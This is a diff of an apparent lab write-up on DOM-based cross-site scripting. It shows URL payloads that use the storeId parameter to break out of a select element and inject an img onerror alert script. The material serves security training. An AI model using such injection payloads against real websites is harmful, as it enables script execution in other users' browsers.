@@ -32,7 +32,7 @@ Looking at the javascript:
                                 document.write('</select>');
 ```
 
-I a going want to break out of this select element using the StoreId source:
+I am going want to break out of this select element using the StoreId source:
 
 ```javascript
 document.write('<select name="storeId">');
@@ -66,7 +66,9 @@ breaking out
 ```
 So the new url would be
 
+```
 /product?productId=1&storeId="></select>BREAK OUT
+```
 
 ![image](https://user-images.githubusercontent.com/83407557/211240727-c6b2e24c-cfd1-47c0-9d00-aa26a10c7362.png)
 
@@ -74,8 +76,10 @@ So the new url would be
 
 Now I know that this is how I am meant to solve this lab with a payload like:
 
+```
 /product?productId=1&storeId="></select><img src onerror=alert(1)>
-                                             
+```
+
 Which I will show:
 
 ![image](https://user-images.githubusercontent.com/83407557/211241007-cb2aed49-0b75-4e86-ac96-72b6d6ceff3e.png)
@@ -86,7 +90,9 @@ Which I will show:
 
 However, it is not required to close the select element to get XSS to fire off, and alternate payload could be something like 
 
+```
 /product?productId=1&storeId="><img src onerror=alert(2)>
+```
 
 ![image](https://user-images.githubusercontent.com/83407557/211241288-4f2213f0-85fa-4e74-9870-3cdcf6f42f43.png)
 
